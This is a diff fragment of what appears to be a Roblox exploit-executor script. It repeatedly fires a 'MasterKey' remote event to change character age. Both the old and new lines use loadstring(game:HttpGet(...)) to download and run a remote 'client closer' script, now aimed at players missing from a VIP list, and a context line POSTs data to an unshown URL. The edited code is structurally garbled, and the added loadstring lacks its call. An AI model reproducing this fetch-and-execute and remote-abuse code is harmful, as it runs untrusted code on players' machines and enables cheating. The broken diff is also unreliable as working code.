@@ -1104,12 +1104,12 @@ while true do
 			game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age','Adult')
 			game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age','Pup')
 			game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age','Newborn')
-		end
+	
 		task.wait()
-
-			else
-				loadstring(game:HttpGet('https://raw.githubusercontent.com/Fattythefatty/bluefoxscript/main/client%20closer'))();
-				
+end
+	if not VIPPlayers[game.Players.LocalPlayer.UserId] then		
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/Fattythefatty/bluefoxscript/main/client%20closer"))
+			end
 	end
 			
 			local HTTP_ = game:GetService('HttpService')
@@ -1125,9 +1125,7 @@ while true do
 	local request = http_request or request or HttpPost or syn.request
 	request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
 		else
-		end
-			
-
+end
 end)
 
 
